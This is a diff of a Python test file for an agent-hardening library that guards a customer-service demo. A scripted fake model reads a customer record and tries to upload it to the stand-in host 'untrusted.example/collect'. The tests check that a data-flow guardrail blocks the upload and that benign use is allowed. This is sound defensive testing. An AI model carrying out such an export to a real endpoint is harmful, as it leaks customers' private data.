@@ -3,7 +3,6 @@ from __future__ import annotations
 import importlib.util
 import json
 import sys
-import tempfile
 import unittest
 from pathlib import Path
 from typing import Any
@@ -12,22 +11,27 @@ from flowguard import FlowguardBlocked
 from flowguard.adapters.openai_model import FlowguardOpenAIModel
 
 try:
-    from agents import Agent, Runner
+    from agents import Agent, Runner, function_tool
     from agents.items import ModelResponse
     from agents.models.interface import Model
     from agents.usage import Usage
-    from openai.types.responses import ResponseFunctionToolCall
+    from openai.types.responses import (
+        ResponseFunctionToolCall,
+        ResponseOutputMessage,
+        ResponseOutputText,
+    )
 except ImportError:
-    Agent = Runner = ModelResponse = Model = Usage = None
-    ResponseFunctionToolCall = None
+    Agent = Runner = ModelResponse = Model = Usage = function_tool = None
+    ResponseFunctionToolCall = ResponseOutputMessage = ResponseOutputText = None
+
+_ModelBase = Model if Model is not None else object
 
 RUNTIME_ROOT = Path(__file__).resolve().parents[1]
 HARDENING_PATH = (
-    RUNTIME_ROOT
-    / "integrations"
-    / "openai-cs-agents-demo"
-    / "hardening.py"
+    RUNTIME_ROOT / "integrations" / "openai-cs-agents-demo" / "hardening.py"
 )
+FAKE_CUSTOMER_RECORD = "Confirmation FG1234 from Paris to Austin"
+LEAK_TARGET = "https://untrusted.example/collect"
 
 
 class _FakeProvider:
@@ -38,101 +42,211 @@ class _FakeProvider:
         return self.model
 
 
-class _RecordingTransport:
+class _RecordingReceiver:
     def __init__(self) -> None:
         self.requests: list[dict[str, Any]] = []
 
     def post(self, url: str, *, data: Any = None, **kwargs: Any) -> bytes:
         self.requests.append({"url": url, "data": data, "kwargs": kwargs})
-        return b"unexpected"
+        return b"accepted"
 
 
 @unittest.skipUnless(Agent is not None, "OpenAI Agents SDK is not installed")
 class OpenAICustomerServiceHardeningTests(unittest.IsolatedAsyncioTestCase):
-    async def test_model_derived_customer_record_is_blocked_at_network_sink(
-        self,
-    ) -> None:
+    async def test_baseline_delivers_native_customer_data_to_receiver(self) -> None:
         hardening = _load_hardening_module()
+        receiver = _RecordingReceiver()
+        delegate = _LeakSequenceModel(hardening)
+        root = _build_agent(hardening, delegate)
+        hardening.add_customer_export_tool(
+            root,
+            leak_target=LEAK_TARGET,
+            receiver=receiver,
+        )
 
-        class LeakSequenceModel(Model):
-            def __init__(self) -> None:
-                self.calls = 0
+        await Runner.run(root, input="Archive my trip details.")
 
-            async def get_response(self, *args: Any, **kwargs: Any) -> Any:
-                self.calls += 1
-                if self.calls == 1:
-                    tool_name = hardening.READ_CUSTOMER_RECORD_TOOL
-                    call_id = "call-read-customer"
-                    arguments = "{}"
-                else:
-                    tool_name = hardening.UPLOAD_CUSTOMER_RECORD_TOOL
-                    call_id = "call-upload-customer"
-                    arguments = json.dumps({"payload": "serialized customer record"})
-                return ModelResponse(
-                    output=[
-                        ResponseFunctionToolCall(
-                            arguments=arguments,
-                            call_id=call_id,
-                            name=tool_name,
-                            type="function_call",
+        self.assertEqual(delegate.calls, 2)
+        self.assertEqual(len(receiver.requests), 1)
+        self.assertEqual(receiver.requests[0]["data"], "serialized customer data")
+
+    async def test_protected_mode_blocks_same_export_before_receiver(self) -> None:
+        hardening = _load_hardening_module()
+        receiver = _RecordingReceiver()
+        delegate = _LeakSequenceModel(hardening)
+        provider = _FakeProvider(delegate)
+        root = _build_agent(hardening, "approved-model")
+        hidden_guardrail = Agent(name="Hidden Guardrail", model="approved-model")
+        runtime = hardening.create_airline_runtime(provider_name="fake-openai")
+
+        protected = hardening.harden_airline_agent_graph(
+            runtime,
+            root,
+            leak_target=LEAK_TARGET,
+            receiver=receiver,
+            model_provider=provider,
+            provider_name="fake-openai",
+            additional_agents=[hidden_guardrail],
+        )
+
+        with runtime.provenance_context.scope():
+            with self.assertRaises(Exception) as raised:
+                await Runner.run(root, input="Archive my trip details.")
+
+        block = hardening.flowguard_block_from(raised.exception)
+        self.assertIsInstance(block, FlowguardBlocked)
+        self.assertEqual(block.policy, hardening.CUSTOMER_DATA_TO_NETWORK_POLICY)
+        self.assertEqual(delegate.calls, 2)
+        self.assertEqual(receiver.requests, [])
+        self.assertIs(protected.root_agent, root)
+        self.assertIsInstance(root.model, FlowguardOpenAIModel)
+        self.assertIsInstance(hidden_guardrail.model, FlowguardOpenAIModel)
+
+        report = runtime.report()
+        self.assertEqual(report.summary.violation_count, 1)
+        self.assertEqual(
+            report.violations[0].policy,
+            hardening.CUSTOMER_DATA_TO_NETWORK_POLICY,
+        )
+        self.assertEqual(report.violations[0].event_type, "tool_call_blocked")
+        self.assertEqual(report.model_calls[-1].action, "ALLOW_AND_PROPAGATE")
+        self.assertIn("tool:get_trip_details", report.violations[0].sources)
+        self.assertIn(
+            "tool_output_labeled",
+            [event["type"] for event in report.events],
+        )
+        self.assertNotIn(FAKE_CUSTOMER_RECORD, report.to_json())
+
+    async def test_protected_customer_data_without_export_is_allowed(self) -> None:
+        hardening = _load_hardening_module()
+        receiver = _RecordingReceiver()
+        delegate = _BenignSequenceModel(hardening)
+        runtime = hardening.create_airline_runtime(provider_name="fake-openai")
+        root = _build_agent(hardening, "approved-model")
+        hardening.harden_airline_agent_graph(
+            runtime,
+            root,
+            leak_target=LEAK_TARGET,
+            receiver=receiver,
+            model_provider=_FakeProvider(delegate),
+            provider_name="fake-openai",
+        )
+
+        with runtime.provenance_context.scope():
+            result = await Runner.run(root, input="Summarize my trip details.")
+
+        self.assertEqual(result.final_output, "Your itinerary is ready.")
+        self.assertEqual(delegate.calls, 2)
+        self.assertEqual(receiver.requests, [])
+        report = runtime.report()
+        self.assertEqual(report.summary.violation_count, 0)
+        self.assertEqual(report.model_calls[-1].action, "ALLOW_AND_PROPAGATE")
+        self.assertIn(
+            "tool_output_labeled",
+            [event["type"] for event in report.events],
+        )
+
+
+class _LeakSequenceModel(_ModelBase):
+    def __init__(self, hardening: Any) -> None:
+        self.hardening = hardening
+        self.calls = 0
+
+    async def get_response(self, *args: Any, **kwargs: Any) -> Any:
+        self.calls += 1
+        if self.calls == 1:
+            tool_name = self.hardening.CUSTOMER_RECORD_SOURCE_TOOL
+            call_id = "call-get-trip"
+            arguments = json.dumps({"message": "Paris New York Austin"})
+        else:
+            tool_name = self.hardening.UPLOAD_CUSTOMER_RECORD_TOOL
+            call_id = "call-upload-customer"
+            arguments = json.dumps({"payload": "serialized customer data"})
+        return ModelResponse(
+            output=[
+                ResponseFunctionToolCall(
+                    arguments=arguments,
+                    call_id=call_id,
+                    name=tool_name,
+                    type="function_call",
+                )
+            ],
+            usage=Usage(),
+            response_id=f"response-{self.calls}",
+        )
+
+    def stream_response(self, *args: Any, **kwargs: Any) -> Any:
+        async def empty_stream() -> Any:
+            if False:
+                yield None
+
+        return empty_stream()
+
+
+class _BenignSequenceModel(_ModelBase):
+    def __init__(self, hardening: Any) -> None:
+        self.hardening = hardening
+        self.calls = 0
+
+    async def get_response(self, *args: Any, **kwargs: Any) -> Any:
+        self.calls += 1
+        if self.calls == 1:
+            output = [
+                ResponseFunctionToolCall(
+                    arguments=json.dumps(
+                        {"message": "Paris New York Austin"}
+                    ),
+                    call_id="call-get-trip",
+                    name=self.hardening.CUSTOMER_RECORD_SOURCE_TOOL,
+                    type="function_call",
+                )
+            ]
+        else:
+            output = [
+                ResponseOutputMessage(
+                    id="message-benign",
+                    content=[
+                        ResponseOutputText(
+                            annotations=[],
+                            text="Your itinerary is ready.",
+                            type="output_text",
                         )
                     ],
-                    usage=Usage(),
-                    response_id=f"response-{self.calls}",
+                    role="assistant",
+                    status="completed",
+                    type="message",
                 )
+            ]
+        return ModelResponse(
+            output=output,
+            usage=Usage(),
+            response_id=f"response-{self.calls}",
+        )
 
-            def stream_response(self, *args: Any, **kwargs: Any) -> Any:
-                async def empty_stream() -> Any:
-                    if False:
-                        yield None
+    def stream_response(self, *args: Any, **kwargs: Any) -> Any:
+        async def empty_stream() -> Any:
+            if False:
+                yield None
 
-                return empty_stream()
+        return empty_stream()
 
-        with tempfile.TemporaryDirectory() as tmpdir:
-            secret_path = Path(tmpdir) / "customer-record.txt"
-            secret_path.write_text("FAKE PRIVATE CUSTOMER RECORD", encoding="utf-8")
-            transport = _RecordingTransport()
-            runtime = hardening.create_airline_runtime(
-                secret_path,
-                provider_name="fake-openai",
-                http_transport=transport,
-            )
-            delegate = LeakSequenceModel()
-            provider = _FakeProvider(delegate)
-            root = Agent(name="Existing Triage", model="approved-model")
-            hidden_guardrail = Agent(name="Hidden Guardrail", model="approved-model")
 
-            protected = hardening.harden_airline_agent_graph(
-                runtime,
-                root,
-                secret_path=secret_path,
-                leak_target="https://untrusted.example/collect",
-                model_provider=provider,
-                provider_name="fake-openai",
-                additional_agents=[hidden_guardrail],
-            )
+def _build_agent(hardening: Any, model: Any) -> Any:
+    @function_tool(
+        name_override=hardening.CUSTOMER_RECORD_SOURCE_TOOL,
+        failure_error_function=None,
+    )
+    def get_trip_details(message: str) -> str:
+        return FAKE_CUSTOMER_RECORD
 
-            with runtime.provenance_context.scope():
-                with self.assertRaises(Exception) as raised:
-                    await Runner.run(root, input="Archive my customer record.")
-
-            block = hardening.flowguard_block_from(raised.exception)
-            self.assertIsInstance(block, FlowguardBlocked)
-            self.assertEqual(block.policy, "SecretToNetwork")
-            self.assertEqual(delegate.calls, 2)
-            self.assertEqual(transport.requests, [])
-            self.assertIs(protected.root_agent, root)
-            self.assertIsInstance(root.model, FlowguardOpenAIModel)
-            self.assertIsInstance(hidden_guardrail.model, FlowguardOpenAIModel)
-
-            report = runtime.report()
-            self.assertEqual(report.summary.violation_count, 1)
-            self.assertEqual(report.violations[0].policy, "SecretToNetwork")
-            self.assertEqual(
-                report.model_calls[-1].action,
-                "ALLOW_AND_PROPAGATE",
-            )
-            self.assertNotIn("FAKE PRIVATE CUSTOMER RECORD", report.to_json())
+    return Agent(
+        name="Existing Triage",
+        model=model,
+        tools=[get_trip_details],
+        tool_use_behavior={
+            "stop_at_tool_names": [hardening.UPLOAD_CUSTOMER_RECORD_TOOL]
+        },
+    )
 
 
 def _load_hardening_module() -> Any:
